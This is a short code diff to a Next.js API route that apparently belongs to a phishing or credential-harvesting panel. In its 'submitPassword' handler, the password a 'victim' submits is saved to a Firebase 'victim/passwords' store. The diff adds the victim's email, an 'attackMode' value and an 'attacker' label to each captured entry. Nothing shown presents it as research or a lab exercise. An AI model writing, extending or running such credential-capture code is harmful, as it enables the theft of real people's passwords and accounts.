@@ -143,13 +143,17 @@ export async function POST(request: NextRequest) {
       case 'submitPassword': {
         const appState = await getAppState();
         const victim = appState.victim;
+        const config = appState.config;
 
         const newAttempts = (victim.attempts || 0) + 1;
         
         const passwordsRef = ref(db, 'victim/passwords');
         const passwordEntry = {
             value: body.password,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            email: victim.email,
+            attackMode: config.attackMode,
+            attacker: 'Admin' // Assuming a single admin user
         };
         await firebasePush(passwordsRef, passwordEntry);
 
@@ -208,5 +212,3 @@ export async function POST(request: NextRequest) {
     return NextResponse.json({ error: 'Internal Server Error', details: errorMessage }, { status: 500 });
   }
 }
-
-    
